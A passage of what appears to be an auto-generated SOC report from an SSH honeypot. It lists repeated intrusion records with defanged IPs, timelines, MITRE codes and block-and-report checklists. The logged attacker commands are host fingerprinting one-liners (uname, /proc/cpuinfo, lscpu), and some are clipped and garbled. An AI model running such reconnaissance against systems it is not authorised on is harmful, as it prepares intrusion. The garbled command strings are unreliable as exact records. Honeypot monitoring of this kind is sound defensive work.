| **Last Seen** | 2026-06-27 11:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:57:44` | `cowrie.session.connect` |
| `2026-06-27 11:57:45` | `cowrie.client.version` |
| `2026-06-27 11:57:45` | `cowrie.client.kex` |
| `2026-06-27 11:57:47` | `cowrie.login.success` |
| `2026-06-27 11:57:49` | `cowrie.session.params` |
| `2026-06-27 11:57:49` | `cowrie.command.input` |
| `2026-06-27 11:57:49` | `cowrie.command.input` |
| `2026-06-27 11:57:49` | `cowrie.command.input` |
| `2026-06-27 11:57:49` | `cowrie.command.input` |
| `2026-06-27 11:57:49` | `cowrie.log.closed` |
| `2026-06-27 11:57:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]13` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-011e93eb6653

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:58 |
| **Last Seen** | 2026-06-27 11:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:58:20` | `cowrie.session.connect` |
| `2026-06-27 11:58:20` | `cowrie.client.version` |
| `2026-06-27 11:58:21` | `cowrie.client.kex` |
| `2026-06-27 11:58:21` | `cowrie.login.success` |
| `2026-06-27 11:58:22` | `cowrie.session.params` |
| `2026-06-27 11:58:22` | `cowrie.command.input` |
| `2026-06-27 11:58:22` | `cowrie.log.closed` |
| `2026-06-27 11:58:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afb0282ba005

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:59 |
| **Last Seen** | 2026-06-27 11:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:59:23` | `cowrie.session.connect` |
| `2026-06-27 11:59:23` | `cowrie.client.version` |
| `2026-06-27 11:59:23` | `cowrie.client.kex` |
| `2026-06-27 11:59:23` | `cowrie.login.success` |
| `2026-06-27 11:59:24` | `cowrie.session.params` |
| `2026-06-27 11:59:24` | `cowrie.command.input` |
| `2026-06-27 11:59:24` | `cowrie.log.closed` |
| `2026-06-27 11:59:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a00c757b301b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]13` |
| **First Seen** | 2026-06-27 11:59 |
| **Last Seen** | 2026-06-27 11:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:59:32` | `cowrie.session.connect` |
| `2026-06-27 11:59:33` | `cowrie.client.version` |
| `2026-06-27 11:59:33` | `cowrie.client.kex` |
| `2026-06-27 11:59:35` | `cowrie.login.success` |
| `2026-06-27 11:59:37` | `cowrie.session.params` |
| `2026-06-27 11:59:37` | `cowrie.command.input` |
| `2026-06-27 11:59:37` | `cowrie.command.input` |
| `2026-06-27 11:59:37` | `cowrie.command.input` |
| `2026-06-27 11:59:37` | `cowrie.command.input` |
| `2026-06-27 11:59:37` | `cowrie.log.closed` |
| `2026-06-27 11:59:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]13` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d512d3dec587

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-27 11:59 |
| **Last Seen** | 2026-06-27 11:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:59:38` | `cowrie.session.connect` |
| `2026-06-27 11:59:39` | `cowrie.client.version` |
| `2026-06-27 11:59:39` | `cowrie.client.kex` |
| `2026-06-27 11:59:41` | `cowrie.login.success` |
| `2026-06-27 11:59:42` | `cowrie.session.params` |
| `2026-06-27 11:59:42` | `cowrie.command.input` |
| `2026-06-27 11:59:43` | `cowrie.log.closed` |
| `2026-06-27 11:59:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b6cab85c447

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:00 |
| **Last Seen** | 2026-06-27 12:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:00:22` | `cowrie.session.connect` |
| `2026-06-27 12:00:22` | `cowrie.client.version` |
| `2026-06-27 12:00:22` | `cowrie.client.kex` |
| `2026-06-27 12:00:22` | `cowrie.login.success` |
| `2026-06-27 12:00:23` | `cowrie.session.params` |
| `2026-06-27 12:00:23` | `cowrie.command.input` |
| `2026-06-27 12:00:23` | `cowrie.log.closed` |
| `2026-06-27 12:00:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b28963489fa

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:01 |
| **Last Seen** | 2026-06-27 12:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:01:10` | `cowrie.session.connect` |
| `2026-06-27 12:01:10` | `cowrie.client.version` |
| `2026-06-27 12:01:10` | `cowrie.client.kex` |
| `2026-06-27 12:01:10` | `cowrie.login.success` |
| `2026-06-27 12:01:11` | `cowrie.session.params` |
| `2026-06-27 12:01:11` | `cowrie.command.input` |
| `2026-06-27 12:01:11` | `cowrie.log.closed` |
| `2026-06-27 12:01:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-513e97e51cf8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]13` |
| **First Seen** | 2026-06-27 12:01 |
| **Last Seen** | 2026-06-27 12:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:01:25` | `cowrie.session.connect` |
| `2026-06-27 12:01:25` | `cowrie.client.version` |
| `2026-06-27 12:01:25` | `cowrie.client.kex` |
| `2026-06-27 12:01:28` | `cowrie.login.success` |
| `2026-06-27 12:01:29` | `cowrie.session.params` |
| `2026-06-27 12:01:29` | `cowrie.command.input` |
| `2026-06-27 12:01:29` | `cowrie.command.input` |
| `2026-06-27 12:01:29` | `cowrie.command.input` |
| `2026-06-27 12:01:29` | `cowrie.command.input` |
| `2026-06-27 12:01:30` | `cowrie.log.closed` |
| `2026-06-27 12:01:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]13` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03c5cbcd2a75

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:02 |
| **Last Seen** | 2026-06-27 12:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:02:01` | `cowrie.session.connect` |
| `2026-06-27 12:02:01` | `cowrie.client.version` |
| `2026-06-27 12:02:01` | `cowrie.client.kex` |
| `2026-06-27 12:02:02` | `cowrie.login.success` |
| `2026-06-27 12:02:03` | `cowrie.session.params` |
| `2026-06-27 12:02:03` | `cowrie.command.input` |
| `2026-06-27 12:02:03` | `cowrie.log.closed` |
| `2026-06-27 12:02:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c4e70f757c5

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:03 |
| **Last Seen** | 2026-06-27 12:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:03:11` | `cowrie.session.connect` |
| `2026-06-27 12:03:11` | `cowrie.client.version` |
| `2026-06-27 12:03:11` | `cowrie.client.kex` |
| `2026-06-27 12:03:11` | `cowrie.login.success` |
| `2026-06-27 12:03:12` | `cowrie.session.params` |
| `2026-06-27 12:03:12` | `cowrie.command.input` |
| `2026-06-27 12:03:12` | `cowrie.log.closed` |
| `2026-06-27 12:03:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47d8d9d09c56

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]13` |
| **First Seen** | 2026-06-27 12:03 |
| **Last Seen** | 2026-06-27 12:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:03:13` | `cowrie.session.connect` |
| `2026-06-27 12:03:14` | `cowrie.client.version` |
| `2026-06-27 12:03:14` | `cowrie.client.kex` |
| `2026-06-27 12:03:16` | `cowrie.login.success` |
| `2026-06-27 12:03:17` | `cowrie.session.params` |
| `2026-06-27 12:03:17` | `cowrie.command.input` |
| `2026-06-27 12:03:17` | `cowrie.command.input` |
| `2026-06-27 12:03:17` | `cowrie.command.input` |
| `2026-06-27 12:03:17` | `cowrie.command.input` |
| `2026-06-27 12:03:18` | `cowrie.log.closed` |
| `2026-06-27 12:03:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]13` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb2d79d326ef

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:04 |
| **Last Seen** | 2026-06-27 12:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:04:07` | `cowrie.session.connect` |
| `2026-06-27 12:04:07` | `cowrie.client.version` |
| `2026-06-27 12:04:07` | `cowrie.client.kex` |
| `2026-06-27 12:04:07` | `cowrie.login.success` |
| `2026-06-27 12:04:08` | `cowrie.session.params` |
| `2026-06-27 12:04:08` | `cowrie.command.input` |
| `2026-06-27 12:04:08` | `cowrie.log.closed` |
| `2026-06-27 12:04:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1c5d9cd53fb

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:04 |
| **Last Seen** | 2026-06-27 12:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:04:53` | `cowrie.session.connect` |
| `2026-06-27 12:04:53` | `cowrie.client.version` |
| `2026-06-27 12:04:53` | `cowrie.client.kex` |
| `2026-06-27 12:04:53` | `cowrie.login.success` |
| `2026-06-27 12:04:54` | `cowrie.session.params` |
| `2026-06-27 12:04:54` | `cowrie.command.input` |
| `2026-06-27 12:04:54` | `cowrie.log.closed` |
| `2026-06-27 12:04:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab73db654a3f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]13` |
| **First Seen** | 2026-06-27 12:05 |
| **Last Seen** | 2026-06-27 12:05 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:05:07` | `cowrie.session.connect` |
| `2026-06-27 12:05:07` | `cowrie.client.version` |
| `2026-06-27 12:05:07` | `cowrie.client.kex` |
| `2026-06-27 12:05:09` | `cowrie.login.success` |
| `2026-06-27 12:05:11` | `cowrie.session.params` |
| `2026-06-27 12:05:11` | `cowrie.command.input` |
| `2026-06-27 12:05:11` | `cowrie.command.input` |
| `2026-06-27 12:05:11` | `cowrie.command.input` |
| `2026-06-27 12:05:11` | `cowrie.command.input` |
| `2026-06-27 12:05:12` | `cowrie.log.closed` |
| `2026-06-27 12:05:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]13` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7995a37ba8e9

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:05 |
| **Last Seen** | 2026-06-27 12:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:05:38` | `cowrie.session.connect` |
| `2026-06-27 12:05:38` | `cowrie.client.version` |
| `2026-06-27 12:05:38` | `cowrie.client.kex` |
| `2026-06-27 12:05:38` | `cowrie.login.success` |
| `2026-06-27 12:05:39` | `cowrie.session.params` |
| `2026-06-27 12:05:39` | `cowrie.command.input` |
| `2026-06-27 12:05:39` | `cowrie.log.closed` |
| `2026-06-27 12:05:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d014b1b5a715

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:06 |
| **Last Seen** | 2026-06-27 12:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:06:24` | `cowrie.session.connect` |
| `2026-06-27 12:06:24` | `cowrie.client.version` |
| `2026-06-27 12:06:24` | `cowrie.client.kex` |
| `2026-06-27 12:06:24` | `cowrie.login.success` |
| `2026-06-27 12:06:25` | `cowrie.session.params` |
| `2026-06-27 12:06:25` | `cowrie.command.input` |
| `2026-06-27 12:06:25` | `cowrie.log.closed` |
| `2026-06-27 12:06:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1dfc17f16b2

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:07 |
| **Last Seen** | 2026-06-27 12:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:07:13` | `cowrie.session.connect` |
| `2026-06-27 12:07:13` | `cowrie.client.version` |
| `2026-06-27 12:07:13` | `cowrie.client.kex` |
| `2026-06-27 12:07:13` | `cowrie.login.success` |
| `2026-06-27 12:07:14` | `cowrie.session.params` |
| `2026-06-27 12:07:14` | `cowrie.command.input` |
| `2026-06-27 12:07:14` | `cowrie.log.closed` |
| `2026-06-27 12:07:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c53e2f2f08a0

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-27 12:07 |
| **Last Seen** | 2026-06-27 12:07 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:07:26` | `cowrie.session.connect` |
| `2026-06-27 12:07:27` | `cowrie.client.version` |
| `2026-06-27 12:07:27` | `cowrie.client.kex` |
| `2026-06-27 12:07:33` | `cowrie.login.success` |
| `2026-06-27 12:07:35` | `cowrie.session.params` |
| `2026-06-27 12:07:35` | `cowrie.command.input` |
| `2026-06-27 12:07:37` | `cowrie.log.closed` |
| `2026-06-27 12:07:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e76873b4a66a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:07 |
| **Last Seen** | 2026-06-27 12:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:07:59` | `cowrie.session.connect` |
| `2026-06-27 12:07:59` | `cowrie.client.version` |
| `2026-06-27 12:07:59` | `cowrie.client.kex` |
| `2026-06-27 12:07:59` | `cowrie.login.success` |
| `2026-06-27 12:08:00` | `cowrie.session.params` |
| `2026-06-27 12:08:00` | `cowrie.command.input` |
| `2026-06-27 12:08:00` | `cowrie.log.closed` |
| `2026-06-27 12:08:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e34e403a456

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:08 |
| **Last Seen** | 2026-06-27 12:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:08:48` | `cowrie.session.connect` |
| `2026-06-27 12:08:48` | `cowrie.client.version` |
| `2026-06-27 12:08:48` | `cowrie.client.kex` |
| `2026-06-27 12:08:48` | `cowrie.login.success` |
| `2026-06-27 12:08:49` | `cowrie.session.params` |
| `2026-06-27 12:08:49` | `cowrie.command.input` |
| `2026-06-27 12:08:49` | `cowrie.log.closed` |
| `2026-06-27 12:08:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8168a37f3b0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]13` |
| **First Seen** | 2026-06-27 12:08 |
| **Last Seen** | 2026-06-27 12:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:08:50` | `cowrie.session.connect` |
| `2026-06-27 12:08:50` | `cowrie.client.version` |
| `2026-06-27 12:08:50` | `cowrie.client.kex` |
| `2026-06-27 12:08:52` | `cowrie.login.success` |
| `2026-06-27 12:08:53` | `cowrie.session.params` |
| `2026-06-27 12:08:53` | `cowrie.command.input` |
| `2026-06-27 12:08:53` | `cowrie.command.input` |
| `2026-06-27 12:08:53` | `cowrie.command.input` |
| `2026-06-27 12:08:53` | `cowrie.command.input` |
| `2026-06-27 12:08:53` | `cowrie.log.closed` |
| `2026-06-27 12:08:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]13` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4700401599f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
